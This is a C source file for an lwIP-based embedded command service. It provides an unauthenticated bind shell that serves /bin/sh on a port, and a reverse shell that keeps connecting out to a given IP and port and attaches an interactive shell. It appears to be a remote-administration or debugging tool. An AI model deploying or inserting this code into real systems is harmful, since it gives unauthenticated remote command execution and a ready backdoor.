#include "shell_service.h"

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <getopt.h>
#include <pthread.h>

#include "lwip/opt.h"
#include "lwip/mem.h"
#include "lwip/debug.h"
#include "lwip/def.h"
#include "lwip/api.h"
#include "lwip/stats.h"
#include "lwip/inet.h"
#include "lwip/tcp.h"
#include "lwip/tcp_impl.h"

#include "fifo.h"
#include "cmd.h"
#include "log.h"


extern char ** environ;

static sys_sem_t rshell_sem;

enum status {
    STOP    = 0,
    STOPPING = 1,
    RUNNING = 2
};
static const char *status_str[3] = 
{
    "STOP",
    "STOPPING",
    "RUNNING"
};

static enum status shell_status;
static struct tcp_pcb *shell_pcb;
static u16_t shell_port;
static int shell_stop_flag;
static int shell_session_cnt;

static enum status rshell_status;
static struct tcp_pcb *rshell_pcb;
static u16_t rshell_port;
static ip_addr_t rshell_ip;
static int rshell_stop_flag;
static int rshell_session_cnt;
static int rshell_interval;

struct shell_state
{
    int fd_in[2];
    int fd_out[2];
    pid_t child_pid;
    struct tcp_pcb *pcb;
    sfifo_t in_fifo;
    sfifo_t out_fifo;
    int keep_alive_cnt;
    int reversed;
};

static int set_fd_nonblock(int fd)
{
    int flags;
    if((flags = fcntl(fd, F_GETFD, 0)) != -1) {
        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) != -1) {
            return 0;
        }
    }
    return -1;
}

static void shell_close(struct shell_state *state)
{
    int status;
    if(state != NULL) {
        if(state->fd_in[0] != -1) {
            close(state->fd_in[0]); state->fd_in[0] = -1;
        }
        if(state->fd_in[1] != -1) {
            close(state->fd_in[1]); state->fd_in[1] = -1;
        }
        if(state->fd_out[0] != -1) {
            close(state->fd_out[0]); state->fd_out[0] = -1;
        }
        if(state->fd_out[1] != -1) {
            close(state->fd_out[1]); state->fd_out[1] = -1;
        }
        sfifo_close(&state->in_fifo);
        sfifo_close(&state->out_fifo);
        if(state->child_pid != -1) {
            kill(state->child_pid, 9);
            waitpid(state->child_pid, &status, 0);
            state->child_pid = -1;
        }
        if(state->pcb != NULL) {
            tcp_arg(state->pcb, NULL);
            tcp_sent(state->pcb, NULL);
            tcp_recv(state->pcb, NULL);
            tcp_err(state->pcb, NULL);
            tcp_poll(state->pcb, NULL, 0);
            SDBG("shell_close: tcp->state = %d\n", state->pcb->state);
            /* if(state->pcb->state != TIME_WAIT) */
            tcp_close(state->pcb);
            state->pcb = NULL;
        }
        if(state->reversed) {
            sys_sem_signal(&rshell_sem);
            rshell_session_cnt --;
            if(rshell_session_cnt <= 0 && rshell_status == STOPPING) {
                rshell_session_cnt = 0;
                rshell_status = STOP;
            }
        } else {
            shell_session_cnt --;
            if(shell_session_cnt <= 0&& shell_status == STOPPING) {
                shell_session_cnt = 0;
                shell_status = STOP;
            }
        }
        free(state);
    }
}

static void shell_msgerr(void *arg, err_t err)
{
    struct shell_state *state = arg;
    LWIP_UNUSED_ARG(err);
    SDBG("shell_msgerr called %d\n", err);
    state->pcb = NULL; /* pcb already freed !*/
    shell_close(state);
}

static err_t shell_send_data(struct shell_state * state)
{
    int len;
    err_t err;
    char buffer[4096];

    if(state == NULL)
        return ERR_OK;

	if (state->pcb->state > ESTABLISHED)
		return ERR_OK;

    len = sfifo_used(&state->out_fifo);

    if(len > 0) {
        if(len > tcp_sndbuf(state->pcb))
            len = tcp_sndbuf(state->pcb);
        if(len > (int)sizeof(buffer))
            len = (int)sizeof(buffer);

        len = sfifo_try_read(&state->out_fifo, buffer, len);

        err = tcp_write(state->pcb, buffer, len, 1);
        if (err != ERR_OK) {
            SERR("shell_msgsent: error writing!\n");
            shell_close(state);
            return err;
        }
        sfifo_read_ack(&state->out_fifo, len);
        SDBG("shell_msgsent: send %d bytes\n", len);
    }

    return ERR_OK;
}

/* read data from out_fifo and send it to socket  */
static err_t shell_msgsent(void *arg, struct tcp_pcb *pcb, u16_t length)
{
    struct shell_state *state = arg;

    LWIP_UNUSED_ARG(length);

	if (pcb->state > ESTABLISHED)
		return ERR_OK;

    return shell_send_data(state);
}

static err_t shell_msgpoll(void *arg, struct tcp_pcb *pcb)
{
    struct shell_state *state = arg;
    int len, ret, total, status;
    char buffer[4096];
    pid_t pid_ret;
    err_t err;

	if (pcb->state != ESTABLISHED) {
        /*dbg_printf("shell_msgpoll: pcb->state %d != ESTABLISHED\n", pcb->state);*/
        shell_close(state);
		return ERR_OK;
    }

    if(!state->reversed && shell_stop_flag) {
        tcp_abort(state->pcb);
		return ERR_OK;
    } else if(state->reversed && rshell_stop_flag) {
        tcp_abort(state->pcb);
		return ERR_OK;
    }

    
    state->keep_alive_cnt ++;
    if(state->keep_alive_cnt > SHELL_KEEP_ALIVE_INTERVAL) {
        state->keep_alive_cnt = 0;
        tcp_keepalive(pcb);
        pcb->keep_cnt_sent ++;
        SDBG("shell_msgpoll pcb->keep_cnt_sent %d, max %d\n", pcb->keep_cnt_sent, SHELL_MAX_KEEP_ALIVE_CNT);
        if(pcb->keep_cnt_sent > SHELL_MAX_KEEP_ALIVE_CNT) {
            SWAN("shell_msgpoll: timeout!\n");
            shell_close(state);
            return ERR_OK;
        }
    }
    

    /* read data from fd_out, write into out_fifo */
    len = sfifo_space(&state->out_fifo);

    if(len > 0) {
        if(len > (int)sizeof(buffer))
            len = (int)sizeof(buffer);

        ret = read(state->fd_out[0], buffer, len);
        if(ret < 0) {
            if(errno != EAGAIN) {
                SERR("shell_msgpoll: read shell error %d\n", errno);
                shell_close(state);
                return ERR_OK;
            } else {
                goto write_fd_in;
            }
        } else if(ret == 0) {
            SERR("shell_msgpoll: read shell return 0\n");
            goto write_fd_in;
        }
        
        total = sfifo_write(&state->out_fifo, buffer, ret);
        if((err = shell_send_data(state)) != ERR_OK) {
            SERR("shell_send_data error %d\n", err);
            shell_close(state);
            return ERR_OK;
        }
    }

write_fd_in:
    /* read data from in_fifo, write into fd_in */
    len = sfifo_used(&state->in_fifo);

    if( len > 0) {
        if(len > (int)sizeof(buffer))
            len = (int)sizeof(buffer);
        len = sfifo_try_read(&state->in_fifo, buffer, len);
        ret = write(state->fd_in[1], buffer, len);
        if(ret < 0) {
            if(errno != EAGAIN) {
                SERR("shell_msgpoll: write shell error %d\n", errno);
                shell_close(state);
                return ERR_OK;
            } else {
                goto wait_pid;
            }
        }
        sfifo_read_ack(&state->in_fifo, ret);
    }

wait_pid:
    /* wait pid for child */
        pid_ret = waitpid(state->child_pid, &status, WNOHANG|WUNTRACED);
        if(pid_ret == 0) { /* still running */
            return ERR_OK;
        } else if(pid_ret == state->child_pid){
            if(WIFEXITED(status)) {
                SDBG("pid %d exit, status %d, exit code %d\n", pid_ret, status, WEXITSTATUS(status));
                state->child_pid = -1;
                shell_close(state);
                return ERR_OK;
            } else if(WIFSIGNALED(status)) {
                SDBG("pid %d killed, status %d, signal %d\n", pid_ret, status, WTERMSIG(status));
                state->child_pid = -1;
                shell_close(state);
                return ERR_OK;
            } else if(WIFSTOPPED(status)) {
                SDBG("pid %d stopped, status %d, signal %d\n", pid_ret, status, WSTOPSIG(status));
                return ERR_OK;
            }
        } else {
            state->child_pid = -1;
            SERR("shell_msgpoll: wait pid error %d\n", pid_ret);
            shell_close(state);
            return ERR_OK;
        }

    return ERR_OK;
}

/* push data into in_fifo */
static err_t shell_msgrecv(void *arg, struct tcp_pcb *pcb, struct pbuf *p, err_t err)
{
    struct shell_state *state = arg;
    int len, total;
    struct pbuf *q;
    

    if ((err != ERR_OK) || (p == NULL)) {
        if (p != NULL) {
            /* Inform TCP that we have taken the data. */
            tcp_recved(pcb, p->tot_len);
            pbuf_free(p);
        }
        return ERR_OK;
    }

    len = sfifo_space(&state->in_fifo);

    if(len >= p->tot_len) {
        total = 0;
        for (q = p; q != NULL; q = q->next) {
            total += sfifo_write(&state->in_fifo, q->payload, q->len);
        }
        SDBG("shell_msgrecv total = %d, p->tot_len = %d, p->len = %d\n", total, p->tot_len, p->len);

        tcp_recved(pcb, p->tot_len);

        pbuf_free(p);

        return ERR_OK;
    }
    SDBG("shell_msgrecv refuse packet\n");
    return ERR_MEM;
}

static int shell_init(struct shell_state *state, struct tcp_pcb *pcb)
{
	/* Initialize the structure. */
	state->pcb = pcb;
    state->fd_in[0] = state->fd_in[1] = -1;
    state->fd_out[0] = state->fd_out[1] = -1;
    state->child_pid = -1;

    if(sfifo_init(&state->in_fifo, 40960) 
        || sfifo_init(&state->out_fifo, 40960)) {
        goto fail;
    }

    if(pipe(state->fd_in) < 0 || pipe(state->fd_out) < 0) {
        goto fail;
    }

    if(set_fd_nonblock(state->fd_in[1]) != 0 
    ||set_fd_nonblock(state->fd_out[0]) != 0 ) {
        goto fail;
    }

    state->child_pid = fork();
    if(state->child_pid < 0) {
        goto fail;
    }

    if(0 == state->child_pid) { /* child */
        char * cmd[4];
        close(state->fd_in[1]); state->fd_in[1] = -1;
        close(state->fd_out[0]); state->fd_out[0] = -1; /* 0 for read, 1 for write*/
        close(0); close(1); close(2);
        if((dup2(state->fd_in[0], 0)) == -1
            || (dup2(state->fd_out[1], 1)) == -1 
            || (dup2(state->fd_out[1], 2)) == -1) {
            exit(253);
        }
        close(state->fd_in[0]); state->fd_in[0] = -1;
        close(state->fd_out[1]); state->fd_out[1] = -1;

        cmd[0] = (char *)"/bin/sh";
        cmd[1] = (char *)"-i";
        cmd[2] = 0;
        cmd[3] = 0;

        if(execve("/bin/sh", cmd, environ) == -1) {
            exit(255);
        }
        exit(0);

    }

    /* parent */
    close(state->fd_in[0]); state->fd_in[0] = -1;
    close(state->fd_out[1]); state->fd_out[1] = -1; /* 0 for read, 1 for write*/

    if(!state->reversed)
        shell_session_cnt ++;
    

	/* Tell TCP that this is the structure we wish to be passed for our
	   callbacks. */
	tcp_arg(pcb, state);

	/* Tell TCP that we wish to be informed of incoming data by a call
	   to the http_recv() function. */
	tcp_recv(pcb, shell_msgrecv);

	/* Tell TCP that we wish be to informed of data that has been
	   successfully sent by a call to the ftpd_sent() function. */
	tcp_sent(pcb, shell_msgsent);

	tcp_err(pcb, shell_msgerr);

	tcp_poll(pcb, shell_msgpoll, 1);

    return 0;

fail:
    return -1;
}

static err_t shell_msgaccept(void *arg, struct tcp_pcb *pcb, err_t err)
{
	struct shell_state *state;

    LWIP_UNUSED_ARG(err);
    LWIP_UNUSED_ARG(arg);

	/* Allocate memory for the structure that holds the state of the
	   connection. */
	state = malloc(sizeof(struct shell_state));

	if (state == NULL) {
		SERR("shell_msgaccept: Out of memory\n");
		return ERR_MEM;
	}
	memset(state, 0, sizeof(struct shell_state));

    if(shell_init(state, pcb) < 0) {
        goto fail;
    }

	return ERR_OK;
fail:
    if(NULL != state) {
        shell_close(state);
        state = NULL;
    }
    return ERR_CLSD;
}

static err_t shell_connected(void *arg, struct tcp_pcb *pcb, err_t err)
{
    struct shell_state *state = arg;

    LWIP_UNUSED_ARG(err);

    /* if connect error, msg_err called */

    SDBG("shell_connected called\n");

    if(shell_init(state, pcb) < 0) {
        SERR("shell_connected: shell_init failed\n");
        shell_close(state);
        state = NULL;
    }

    return ERR_OK;
}


static void reverse_shell_thread(void *arg) 
{
    struct shell_state *state;
    err_t err;

    LWIP_UNUSED_ARG(arg);

    while(!rshell_stop_flag) {
        usleep(rshell_interval * 1000);
        state = malloc(sizeof(struct shell_state));

        if (state == NULL) {
            SERR("reverse_shell_thread: Out of memory\n");
            return;
        }
        memset(state, 0, sizeof(struct shell_state));

        rshell_pcb = tcp_new();
        SDBG("***new tcp %p***\n", (void *)rshell_pcb);

        state->pcb = rshell_pcb;
        state->reversed = 1; 

        state->child_pid = -1; /* avoid kill self */
        state->fd_in[0] = state->fd_in[1] = -1;
        state->fd_out[0] = state->fd_out[1] = -1;

        rshell_session_cnt ++;

        tcp_arg(rshell_pcb, state);
        tcp_err(rshell_pcb, shell_msgerr);

        if( (err = tcp_connect(rshell_pcb, &rshell_ip, rshell_port ,shell_connected)) != ERR_OK) {
            tcp_err(rshell_pcb, NULL);

            tcp_arg(rshell_pcb, NULL);

            tcp_close(rshell_pcb);
            free(state);
            
            continue;
        
        }
        SDBG("wait on reverse shell quit\n");
        sys_sem_wait(&rshell_sem);
    }
    
    SDBG("rshell thread quit\n");
}


/* ------------------------------------------------------------------------------------------------------------------- */

static int do_start_shell(cmd_slot_t * slot, cmd_out_handle_t * out, int argc, char ** argv)
{
    int ch;
    err_t err;
    struct tcp_pcb *pcb;
    optind = 0;

    shell_port = SHELL_SERVICE_PORT;

    if(shell_status != STOP ) {
        cmd_printf(out, "shell service still running");
        return -1;
    }

    while( (ch = getopt(argc, argv, "b:")) != -1) {
        switch(ch) {
        case 'b':
            shell_port = atoi(optarg);
            break;
        default:
            cmd_printf(out, slot->info == NULL ? slot->info : "sytex error\n");
            return -1;
        }
    }

    if(shell_port <= 0) {
        cmd_printf(out, slot->info == NULL ? slot->info : "sytex error\n");
        return -1;
    }
    
    shell_pcb = tcp_new();
    shell_stop_flag = 0;

    if((err = tcp_bind(shell_pcb, IP_ADDR_ANY, shell_port)) != ERR_OK) {
        cmd_printf(out, "can not bind to port %d (%s)\n", shell_port, lwip_strerr(err));
        tcp_close(shell_pcb);
        shell_pcb = NULL;
        return -1;
    }

	pcb = tcp_listen(shell_pcb);
    if(NULL == pcb) {
        cmd_printf(out, "can not set to listen state\n");
        tcp_close(shell_pcb);
        shell_pcb = NULL;
        return -1;
    }
    shell_pcb = pcb;

	tcp_accept(shell_pcb, shell_msgaccept);

    shell_status = RUNNING;
    cmd_printf(out, "service started\n");
    return 0;
}

static int do_stop_shell(cmd_slot_t * slot, cmd_out_handle_t * out, int argc, char ** argv)
{
    LWIP_UNUSED_ARG(slot);
    LWIP_UNUSED_ARG(argc);
    LWIP_UNUSED_ARG(argv);

    if(shell_session_cnt != 0) {
        shell_status = STOPPING;
    } else {
        shell_status = STOP;
    }
            
    shell_stop_flag = 1;

    if(shell_pcb != NULL) {
        tcp_close(shell_pcb);
        shell_pcb = NULL;
    }

    cmd_printf(out, "stop command issued, use get_shell_status to watch status\n");

    return 0;
}

static int do_get_shell_status(cmd_slot_t * slot, cmd_out_handle_t * out, int argc, char ** argv)
{
    LWIP_UNUSED_ARG(slot);
    LWIP_UNUSED_ARG(argc);
    LWIP_UNUSED_ARG(argv);

    cmd_printf(out, "shell status: %s, port is %d, session count %d\n",
        status_str[shell_status],
        shell_port, shell_session_cnt);
    return 0;
}


static int worker_thread_new(const char *name, lwip_thread_fn function, void *arg, int stacksize, int prio)
{
  int code;
  pthread_t tmp;
  LWIP_UNUSED_ARG(name);
  LWIP_UNUSED_ARG(stacksize);
  LWIP_UNUSED_ARG(prio);

  code = pthread_create(&tmp,
                        NULL, 
                        (void *(*)(void *)) 
                        function, 
                        arg);
  
  return code == 0 ? 0 : -1;;
}

static int do_start_rshell(cmd_slot_t * slot, cmd_out_handle_t * out, int argc, char ** argv)
{
    int ch;
    err_t err;
    struct tcp_pcb *pcb;
    optarg = NULL;
    optind = 0;
       
    LWIP_UNUSED_ARG(err);
    LWIP_UNUSED_ARG(pcb);    

    rshell_port = RSHELL_CONNECT_PORT;
    rshell_interval = RSHELL_INTERVAL_MS;

    if(rshell_status != STOP ) {
        cmd_printf(out, "reverse shell service still running");
        return -1;
    }

    while( (ch = getopt(argc, argv, "h:i:c:")) != -1) {
        switch(ch) {
        case 'c':
            rshell_port = atoi(optarg);
            break;
        case 'i':
            rshell_interval = atoi(optarg);
            break;
        case 'h':
            if(!inet_aton(optarg, &rshell_ip))
            cmd_printf(out, "invalid ip addr %s\n", optarg);
            break;
        default:
            cmd_printf(out, slot->info == NULL ? slot->info : "sytex error\n");
            return -1;
        }
    }

    if(rshell_port <= 0 || rshell_ip.addr == INADDR_ANY) {
        cmd_printf(out, slot->info == NULL ? slot->info : "sytex error\n");
        return -1;
    }
    
    rshell_stop_flag = 0;   

    if(worker_thread_new("rshell_thread", reverse_shell_thread, NULL, DEFAULT_THREAD_STACKSIZE, DEFAULT_THREAD_PRIO) != 0) {
        cmd_printf(out, slot->info == NULL ? slot->info : "can not start rshell thread\n");
        tcp_close(rshell_pcb);
        rshell_pcb = 0;
        return -1;
    }
    rshell_status = RUNNING;
    cmd_printf(out, "service started\n");
    return 0;
}

static int do_stop_rshell(cmd_slot_t * slot, cmd_out_handle_t * out, int argc, char ** argv)
{
    LWIP_UNUSED_ARG(slot);
    LWIP_UNUSED_ARG(argc);
    LWIP_UNUSED_ARG(argv);

    if(rshell_session_cnt != 0) {
        rshell_status = STOPPING;
    } else {
        rshell_status = STOP;
    }
    rshell_stop_flag = 1;

    sys_sem_signal(&rshell_sem);
    rshell_pcb = NULL;

    cmd_printf(out, "stop command issued, use get_rshell_status to watch status\n");

    return 0;
}

static int do_get_rshell_status(cmd_slot_t * slot, cmd_out_handle_t * out, int argc, char ** argv)
{
    char ip_str[32];

    LWIP_UNUSED_ARG(slot);
    LWIP_UNUSED_ARG(argc);
    LWIP_UNUSED_ARG(argv);

    inet_ntoa_r(rshell_ip, ip_str, sizeof(ip_str));

    cmd_printf(out, "shell status: %s, ip is %s, port is %d, session count %d\n",
        status_str[rshell_status], ip_str,
        rshell_port, rshell_session_cnt);
    return 0;
}

void shell_service_init(void)
{
    sys_sem_new(&rshell_sem, 0);

    reg_cmd(do_start_shell, "start_shell", "start passive shell service, usage: start_shell -b [bind port]\n");
    reg_cmd(do_stop_shell, "stop_shell", "stop passive shell service\n");
    reg_cmd(do_get_shell_status, "get_shell_status", "get passive shell service status\n");

    reg_cmd(do_start_rshell, "start_rshell", "start reverse shell service, usage: start_rshell -h [peerip] -c [port] -i [interval_ms]\n");
    reg_cmd(do_stop_rshell, "stop_rshell", "stop reverse shell service\n");
    reg_cmd(do_get_rshell_status, "get_rshell_status", "get reverse shell service status\n");
}
